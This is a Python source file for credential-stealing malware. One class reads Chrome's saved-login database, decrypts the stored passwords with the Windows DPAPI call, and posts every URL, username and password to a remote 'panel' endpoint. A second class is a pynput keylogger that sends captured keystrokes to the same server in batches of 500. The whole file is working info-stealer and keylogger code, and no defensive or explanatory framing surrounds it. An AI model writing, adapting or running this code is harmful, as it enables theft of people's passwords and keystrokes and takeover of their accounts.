import os
import win32crypt
import pynput
import sqlite3
import requests

class Cred_Grabber(object):
    
    KEY = ''
    PANEL_ADDR = ''
    
    def __init__(self, key, addr, ):
        self.KEY = key
        self.PANEL_ADDR = addr
        self.cred_grab()
    
    def getpath(self):
        if os.name == 'nt':
            return os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
        elif os.name == 'posix':
            return os.getenv('HOME') + '/.config/google-chrome/Default/'
        else:
            return ''
    
    def cred_grab(self):
        login_data = []
        
        try:
            with sqlite3.connect(self.getpath()+"Login Data") as db_creds:
                db_exe = db_creds.cursor()
                datas = db_exe.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
        
            for data in datas:
                
                if os.name == "nt":
                    password = win32crypt.CryptUnprotectData(data[2], None, None, None, 0)[1]
                    if password:
                        login_data.append({
                            'origin_url': data[0],
                            'username': data[1],
                            'password': str(password.decode())
                        })
        
                elif os.name == 'posix':
                    login_data.append({
                        'origin_url': data[0],
                        'username': data[1],
                        'password': data[2].decode()
                    })
            
            for data in login_data:
                requests.post(self.PANEL_ADDR+"getcreds/", data={'key':self.KEY, 'user':data['username'], 'passwd':data['password'], 'url':data['origin_url']})
        
        except sqlite3.DatabaseError:
            pass
        finally:
            db_exe.close()
            
class Key_Grabber(object):
    
    keys = []
    KEY = ''
    PANEL_ADDR = ''
    
    def __init__(self, key, addr):
        self.KEY = key
        self.PANEL_ADDR = addr
        self.run()
    
    def on_press(self, key):
        self.keys.append(str(key))
        if len(self.keys) == 500:    
            requests.post(self.PANEL_ADDR+"getkeys/", data={'key':self.KEY, 'text':' '.join(self.keys)})
            self.keys = []
    
    def run(self):
        with pynput.keyboard.Listener(on_press = self.on_press) as listener:
            listener.join()
        
            
        